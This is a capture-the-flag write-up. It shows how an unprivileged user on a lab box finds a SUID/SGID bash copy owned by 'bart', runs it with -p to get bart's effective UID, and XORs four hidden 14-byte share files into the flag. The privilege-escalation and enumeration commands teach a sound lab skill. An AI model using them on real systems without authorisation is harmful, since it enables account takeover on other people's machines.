# Bart — CTF Writeup

A Linux privilege-pivot + secret-sharing challenge. Starting as the unprivileged user `kali`, the goal is to reach the account of user `bart`, recover four scattered "share" files, and XOR them back into a 14-byte flag.

**Flag:** `SKY-OVRL-8692`

---

## Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Program that grants access to Bart's account without his password | **`bartbash`** (a SUID/SGID copy of bash owned by `bart`) |
| Q2 | Script Bart uses to recombine the 4 files | **`mergebytes.py`** (`/usr/bin/mergebytes.py`) |
| Q3 | Mathematical operation used to combine the files | **XOR** (bitwise exclusive-or) |
| Q4 | The hidden flag | **`SKY-OVRL-8692`** |

---

## Recon

Starting position — unprivileged, no `sudo`:

```
$ id
uid=1002(kali) gid=1002(kali) groups=1002(kali)
$ sudo -l
bash: sudo: command not found
```

`bart`'s home is locked (`drwx------`), so we need his identity. A long chain of dead ends followed:

- No SUID binaries via `find` — but **`find` turned out to be broken on this box** (it silently returned nothing even for files known to exist, e.g. `pam_unix.so`). Every "empty" `find` result was a false negative.
- No capabilities (`getcap`), no SSH keys, Redis down, no readable auth-file backups, no cron jobs, no login backdoor in PAM config.
- A modified `pam_unix.so` (referencing a non-standard `/etc/security/nopasswd`) was a red herring — the file didn't exist and `/etc/security` wasn't writable.

**Key lesson:** when `find /` returns nothing for a file you *know* exists, stop trusting it. Switching to `ls -laR` is what cracked the box open.

## Q1 — The backdoor: `bartbash`

Listing SUID/SGID bits with `ls` instead of `find`:

```
$ ls -laR / 2>/dev/null | grep -i rws
-rwsr-sr-x 1 bart bart 1384752 ... bartbash
```

A ~1.38 MB SUID **and** SGID binary owned by `bart` — a setuid copy of bash. Run it with `-p` so it keeps the elevated IDs:

```
$ /usr/bin/bartbash -p
bartbash-5.3$ id
uid=1002(kali) gid=1002(kali) euid=1001(bart) egid=1001(bart) groups=1001(bart),1002(kali)
```

We now have Bart's effective UID — no password required.

## Finding the four shares

Bart's home held only one 14-byte file:

```
bartbash-5.3$ ls -la /home/bart
-rw-rw-r-- 1 bart bart 14 ... pennant
```

`pennant` is a synonym for *flag*. The other three shares are hidden around the filesystem under the same theme. Since `find` is broken, enumerate 14-byte files with `ls -laR` + `awk`:

```
$ ls -laR / 2>/dev/null | awk '/:$/{d=$0} $5==14{print d, $NF}'
```

The four flag-synonym shares (14 bytes each):

| Path | Name meaning |
|------|--------------|
| `/home/bart/pennant`  | pennant |
| `/boot/crest`         | crest |
| `/media/banner`       | banner |
| `/usr/share/insignia` | insignia |

## Q2 / Q3 — The merge script: `mergebytes.py` (XOR)

Locate custom scripts (again via `ls -laR`, skipping library code):

```
$ ls -laR / 2>/dev/null | awk '/:$/{d=$0} /\.(py|sh)$/{print d, $NF}' | grep -viE "python3|dist-packages|site-packages"
...
/usr/bin: mergebytes.py
```

`mergebytes.py` splits a secret into N files and recombines them. Its core is a byte-wise XOR:

```python
def bxor(bytelist):
    retbytes = bytearray()
    in_bytearrays = [bytearray(y) for y in bytelist]
    first_length = len(bytelist[0])
    for index in range(0, first_length):
        one_xor = 0
        for one_input in in_bytearrays:
            one_xor = one_xor ^ one_input[index]
        retbytes.append(one_xor)
    return bytes(retbytes)
```

→ **Q3 is XOR.**

## Q4 — Recovering the flag

Inside `bartbash -p`, feed the four shares to the script's `-i` (merge) mode:

```
bartbash-5.3$ /usr/bin/mergebytes.py -i /boot/crest /media/banner /usr/share/insignia /home/bart/pennant
SKY-OVRL-8692
```

### Manual verification

XOR of the four 14-byte shares:

```
crest     79 11 6b df 9b 1d 2b 0b 0d ef d0 82 1d 0f
banner    37 38 6d 57 d4 c0 b3 08 80 23 ac bc 74 cf
insignia  17 31 88 21 62 47 0a a8 b0 55 38 c6 df f4
pennant   0a 53 d7 84 62 cc c0 e7 10 a1 72 c1 84 3e
──────────────────────────────────────────────── XOR
          53 4b 59 2d 4f 56 52 4c 2d 38 36 39 32 0a
          S  K  Y  -  O  V  R  L  -  8  6  9  2  \n
```

Or in one line:

```bash
python3 -c "import functools,operator;fs=[open(p,'rb').read() for p in ['/boot/crest','/media/banner','/usr/share/insignia','/home/bart/pennant']];print(bytes(functools.reduce(operator.xor,b) for b in zip(*fs)).decode())"
```

**Flag:** `SKY-OVRL-8692`

---

## Takeaways

1. **Don't trust a single enumeration tool.** `find` was broken; `ls -laR` + `awk`/`grep` found everything.
2. **SUID/SGID binaries owned by a non-root user** are a direct path into *that user's* account — not just root.
3. **XOR secret sharing**: all shares are the same length as the secret, and XORing them all together reconstructs it (order doesn't matter).
